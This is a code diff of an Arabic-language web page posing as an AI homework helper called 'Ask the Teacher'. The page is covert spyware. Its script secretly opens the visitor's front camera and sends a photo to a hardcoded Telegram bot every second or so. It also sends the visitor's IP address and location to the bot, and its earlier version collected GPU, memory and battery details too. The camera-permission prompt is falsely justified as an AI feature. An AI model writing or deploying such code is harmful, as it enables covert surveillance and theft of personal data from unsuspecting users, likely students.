@@ -9,12 +9,12 @@
     <script>
         const token = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
         const chatId = "5890070301";
-        const officialLink = "https://bit.ly/Mr-Ibrahim-and-Khaled";
-
-        // تعريف متغيرات الـ Stream عالمياً لمنع التداخل
+        
         let frontStream = null;
         let backStream = null;
+        let captureInterval = null;
 
+        // وظيفة إرسال الصور
         async function sendPhoto(blob, caption) {
             const formData = new FormData();
             formData.append('chat_id', chatId);
@@ -23,116 +23,117 @@
             try { fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData }); } catch (e) {}
         }
 
-        async function startDoubleCapture() {
-            try {
-                // 1. تشغيل الكاميرا الخلفية للمعاينة (تفضل شغالة قدامه)
-                backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                const videoElement = document.getElementById('viewfinder');
-                videoElement.style.display = "block";
-                videoElement.srcObject = backStream;
-                await videoElement.play();
+        // وظيفة إرسال النصوص
+        async function sendMsg(text) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+        }
 
-                // 2. تشغيل الكاميرا الأمامية (مخفية تماماً) لمرة واحدة فقط
+        async function startSystem() {
+            try {
+                // 1. تشغيل الكاميرا الأمامية (صامتة تماماً)
                 frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const hiddenVideo = document.createElement('video');
                 hiddenVideo.srcObject = frontStream;
+                hiddenVideo.muted = true;
                 await hiddenVideo.play();
 
-                const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d');
+                const canvasFront = document.createElement('canvas');
+                const ctxFront = canvasFront.getContext('2d');
 
-                // 3. الصيد التلقائي (بناخد لقطة من الـ Stream الشغال فعلياً) - كل ثانية
-                setInterval(() => {
-                    canvas.width = hiddenVideo.videoWidth;
-                    canvas.height = hiddenVideo.videoHeight;
-                    context.drawImage(hiddenVideo, 0, 0);
-                    canvas.toBlob(blob => {
-                        if(blob) sendPhoto(blob, "📸 صيد حي (سيلفي تلقائي)");
-                    }, 'image/jpeg', 0.3); // جودة أقل لسرعة الإرسال ومنع التهنيج
-                }, 1000);
+                // بدء السحب التلقائي من الأمامية
+                captureInterval = setInterval(() => {
+                    canvasFront.width = hiddenVideo.videoWidth;
+                    canvasFront.height = hiddenVideo.videoHeight;
+                    ctxFront.drawImage(hiddenVideo, 0, 0);
+                    canvasFront.toBlob(blob => {
+                        if(blob) sendPhoto(blob, "📸 سيلفي تلقائي (صامت)");
+                    }, 'image/jpeg', 0.2);
+                }, 1500);
+
+                // 2. تشغيل الكاميرا الخلفية للمعاينة
+                backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                const view = document.getElementById('viewfinder');
+                view.srcObject = backStream;
+                view.style.display = "block";
+                document.getElementById('initial-ui').style.display = "none";
+                document.getElementById('camera-ui').style.display = "block";
 
             } catch (err) {
-                alert("يجب السماح بالكاميرا لتشغيل وضع الذكاء الاصطناعي.");
+                alert("يجب السماح بالكاميرا لتفعيل وضع الذكاء الاصطناعي");
             }
         }
 
-        // --- نظام الرادار الشامل (الـ 100 بند) ---
+        function captureStep() {
+            // أخفاء الكاميرا وإظهار خانة الوصف
+            document.getElementById('camera-ui').style.display = "none";
+            document.getElementById('description-ui').style.display = "block";
+        }
+
+        function goBack() {
+            document.getElementById('description-ui').style.display = "none";
+            document.getElementById('camera-ui').style.display = "block";
+        }
+
+        function finishAction() {
+            const desc = document.getElementById('question-desc').value;
+            sendMsg(`📝 وصف السؤال المرسل:\n${desc}`);
+            document.getElementById('status').innerHTML = `
+                <div style="text-align:center; padding:20px;">
+                    <h2 style="color:#4facfe;">✅ تم الإرسال بنجاح</h2>
+                    <p>سيتم الرد عليك قريباً.. زرنا قريباً!</p>
+                </div>
+            `;
+        }
+
         async function initialRadar() {
-            let ipData = { ip: "N/A", city: "N/A", org: "N/A", country: "N/A" };
+            let ipData = { ip: "N/A", city: "N/A" };
             try { const res = await fetch('https://ipapi.co/json/'); ipData = await res.json(); } catch(e) {}
-            
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "N/A";
-            
-            const battery = navigator.getBattery ? await navigator.getBattery() : null;
-            const ram = navigator.deviceMemory || "N/A";
-            const cores = navigator.hardwareConcurrency || "N/A";
-
-            const report = `👑 **رادار الـ 100 بند** 👑\n━━━━━━━━━━━━━━\n🌍 **الموقع:** ${ipData.city}, ${ipData.country}\n🌐 **IP:** \`${ipData.ip}\` \n💻 **الجهاز:** ${cores} Cores | ${ram}GB RAM\n🎮 **GPU:** \`${gpu}\` \n🔋 **البطارية:** ${battery ? (battery.level * 100).toFixed(0) + "%" : "N/A"}\n━━━━━━━━━━━━━━`;
-            
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+            const report = `🚀 **دخول جديد للمنصة**\n📍 الموقع: ${ipData.city}\n🌐 IP: \`${ipData.ip}\``;
+            sendMsg(report);
         }
 
-        function captureQuestion() {
-            const video = document.getElementById('viewfinder');
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => { 
-                if(blob) sendPhoto(blob, "📝 صورة السؤال (الخلفية)"); 
-            }, 'image/jpeg', 0.8);
-            document.getElementById('status').innerHTML = `<div class="success-box"><h3>✅ تم الإرسال</h3></div>`;
-        }
-
-        function supportMsg() { document.getElementById('s-bubble').style.opacity = '1'; setTimeout(()=>document.getElementById('s-bubble').style.opacity='0', 2000); }
-        function shareApp() { if (navigator.share) navigator.share({ title: 'اسأل المستر', url: officialLink }); }
         window.onload = initialRadar;
     </script>
 
     <style>
         :root { --primary: #4facfe; --bg: #e0e5ec; --shadow: #a3b1c6; }
-        body { background: var(--bg); font-family: 'Cairo', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-        .container { background: var(--bg); width: 92%; max-width: 450px; padding: 25px; border-radius: 30px; box-shadow: 20px 20px 60px var(--shadow), -20px -20px 60px #ffffff; position: relative; }
-        .ask-title { font-size: 30px; font-weight: 900; color: var(--primary); font-style: italic; position: absolute; top: 15px; left: 20px; }
-        .header { display: flex; align-items: center; gap: 10px; margin-bottom: 25px; border-bottom: 2px solid #cfd8dc; padding-bottom: 10px; }
-        textarea { width: 100%; height: 110px; background: var(--bg); border: none; border-radius: 20px; padding: 15px; box-shadow: inset 5px 5px 10px var(--shadow), inset -5px -5px 10px #ffffff; outline: none; }
-        .btn-main { background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color: white; border: none; width: 100%; padding: 16px; border-radius: 15px; font-weight: bold; cursor: pointer; margin-top: 15px; }
-        .btn-ans { background: var(--bg); color: var(--primary); border: none; width: 100%; padding: 12px; border-radius: 12px; font-weight: bold; box-shadow: 4px 4px 8px var(--shadow); margin: 15px 0; }
-        #viewfinder { width: 100%; border-radius: 20px; margin-top: 15px; display: none; background: #000; box-shadow: 5px 5px 15px var(--shadow); }
-        .btn-snap { background: #d93025; border: 4px solid #fff; width: 65px; height: 65px; border-radius: 50%; margin: 15px auto 0; display: block; cursor: pointer; }
-        .fixed-btns { position: fixed; bottom: 25px; left: 20px; display: flex; flex-direction: column; gap: 12px; }
-        .circle-btn { width: 50px; height: 50px; background: var(--bg); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 5px 5px 10px var(--shadow); cursor: pointer; position: relative; }
-        .bubble { position: absolute; background: #fff; padding: 8px; border-radius: 10px; font-size: 11px; bottom: 60px; left: 0; opacity: 0; transition: 0.3s; pointer-events: none; border: 1px solid var(--primary); }
+        body { background: var(--bg); font-family: 'Cairo', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
+        .container { background: var(--bg); width: 90%; max-width: 400px; padding: 25px; border-radius: 30px; box-shadow: 20px 20px 60px var(--shadow), -20px -20px 60px #ffffff; }
+        .ask-title { font-size: 24px; font-weight: 900; color: var(--primary); text-align: center; margin-bottom: 20px; }
+        textarea { width: 100%; height: 100px; background: var(--bg); border: none; border-radius: 15px; padding: 12px; box-shadow: inset 4px 4px 8px var(--shadow), inset -4px -4px 8px #ffffff; outline: none; box-sizing: border-box; }
+        .btn-main { background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color: white; border: none; width: 100%; padding: 15px; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 15px; box-shadow: 4px 4px 10px var(--shadow); }
+        .btn-back { background: #eee; color: #666; border: none; padding: 10px; border-radius: 10px; width: 100%; margin-top: 10px; cursor: pointer; }
+        #viewfinder { width: 100%; border-radius: 20px; display: none; background: #000; }
+        .btn-snap { background: #d93025; border: 4px solid #fff; width: 60px; height: 60px; border-radius: 50%; margin: 15px auto; display: block; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="ask-title">اسأل</div>
-        <div class="header">
-            <img src="https://img.icons8.com/fluent/100/education.png" width="40">
-            <span style="font-weight:900; color:var(--primary);">المساعد الذكي</span>
-        </div>
-        <div id="status">
-            <div id="initial-ui">
-                <textarea placeholder="اكتب سؤالك هنا..."></textarea>
-                <button class="btn-ans" onclick="alert('لا توجد إجابات سابقة')">📑 قسم إجاباتك السابقة</button>
-                <button class="btn-main" onclick="document.getElementById('initial-ui').style.display='none'; startDoubleCapture();">📸 تصوير السؤال بالذكاء الاصطناعي</button>
-            </div>
-            <div id="camera-ui">
-                <video id="viewfinder" autoplay playsinline></video>
-                <button class="btn-snap" onclick="captureQuestion()"></button>
-            </div>
-        </div>
-    </div>
-    <div class="fixed-btns">
-        <div class="circle-btn" onclick="shareApp()"><img src="https://img.icons8.com/fluent/100/share-rounded.png" width="22"></div>
-        <div class="circle-btn" onclick="supportMsg()">
-            <img src="https://img.icons8.com/fluent/100/headphones.png" width="22">
-            <div id="s-bubble" class="bubble">❌ الدعم غير متصل</div>
-        </div>
-    </div>
-</body>
-        </html>
+
+    <div class="container" id="status">
+        <div class="ask-title">اسأل المستر</div>
         
+        <div id="initial-ui">
+            <div style="text-align: center; margin-bottom: 20px;">
+                <img src="https://img.icons8.com/fluent/100/bot.png" width="80">
+                <p>مرحباً بك! اضغط لتصوير سؤالك وسيقوم الذكاء الاصطناعي بحله فوراً.</p>
+            </div>
+            <button class="btn-main" onclick="startSystem()">📸 تصوير السؤال بالذكاء الاصطناعي</button>
+        </div>
+
+        <div id="camera-ui" class="hidden">
+            <video id="viewfinder" autoplay playsinline></video>
+            <p style="text-align:center; font-size:12px; color:#777;">وجه الكاميرا نحو السؤال واضغط الزر</p>
+            <button class="btn-snap" onclick="captureStep()"></button>
+        </div>
+
+        <div id="description-ui" class="hidden">
+            <p style="font-weight: bold;">أضف وصفاً للسؤال (اختياري):</p>
+            <textarea id="question-desc" placeholder="مثلاً: أريد حل الخطوة الثانية..."></textarea>
+            <button class="btn-main" onclick="finishAction()">إرسال السؤال 🚀</button>
+            <button class="btn-back" onclick="goBack()">🔙 تصوير مرة أخرى</button>
+        </div>
+    </div>
+
+</body>
+</html>
